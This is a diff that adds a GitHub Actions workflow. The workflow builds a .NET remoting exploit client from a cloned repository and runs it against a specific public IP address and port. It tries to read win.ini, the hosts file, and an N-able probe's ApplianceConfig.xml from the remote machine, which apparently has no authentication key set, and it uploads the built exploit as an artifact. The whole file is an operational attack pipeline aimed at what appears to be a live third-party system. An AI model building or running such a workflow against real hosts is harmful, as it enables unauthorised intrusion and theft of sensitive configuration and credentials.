@@ -1,0 +1,54 @@
+name: Build MBRO exploit v7
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Clone retarget build run
+        run: |
+          git clone https://github.com/securifera/NewRemotingTricks C:\exploit
+          
+          # Retarget ALL csproj to 4.8
+          Get-ChildItem -Path C:\exploit -Recurse -Filter "*.csproj" | ForEach-Object {
+            $c = Get-Content $_.FullName -Raw
+            Set-Content -Path $_.FullName -Value ($c -replace 'v4\.5','v4.8')
+          }
+          
+          # Build
+          $vs = & "C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.Component.MSBuild -find MSBuild\**\Bin\MSBuild.exe 2>$null | Select-Object -First 1
+          $sln = Get-ChildItem -Path C:\exploit -Filter "*.sln" | Select-Object -First 1
+          & $vs $sln.FullName /p:Configuration=Release /verbosity:minimal 2>&1 | Select-Object -Last 5
+          
+          $exe = "C:\exploit\RemotingClient_MBRO\bin\Release\RemotingClient_MBRO.exe"
+          $xaml = "C:\exploit\RemotingClient_MBRO\WebClient.xaml.xml"
+          
+          Write-Host "Exe exists: $(Test-Path $exe)"
+          Write-Host "XAML exists: $(Test-Path $xaml)"
+          
+          # Copy XAML next to exe (where it's expected)
+          Copy-Item $xaml "C:\exploit\RemotingClient_MBRO\bin\Release\"
+          
+          # Run from the Release directory
+          Set-Location "C:\exploit\RemotingClient_MBRO\bin\Release"
+          
+          Write-Host ""
+          Write-Host "=== win.ini read attempt (no AuthKey) ==="
+          & $exe tcp://138.207.64.28:10004/ProofOfConcept "file:///C:/Windows/win.ini" 2>&1
+          Write-Host "Exit: $LASTEXITCODE"
+          
+          Write-Host ""
+          Write-Host "=== ApplianceConfig.xml read attempt ==="
+          & $exe tcp://138.207.64.28:10004/ProofOfConcept "file:///C:/ProgramData/N-able Technologies/Windows Software Probe/config/ApplianceConfig.xml" 2>&1
+          Write-Host "Exit: $LASTEXITCODE"
+          
+          Write-Host ""
+          Write-Host "=== system32 hosts file read ==="
+          & $exe tcp://138.207.64.28:10004/ProofOfConcept "file:///C:/Windows/System32/drivers/etc/hosts" 2>&1
+          Write-Host "Exit: $LASTEXITCODE"
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mbro-v7
+          path: C:\exploit\RemotingClient_MBRO\bin\Release\**
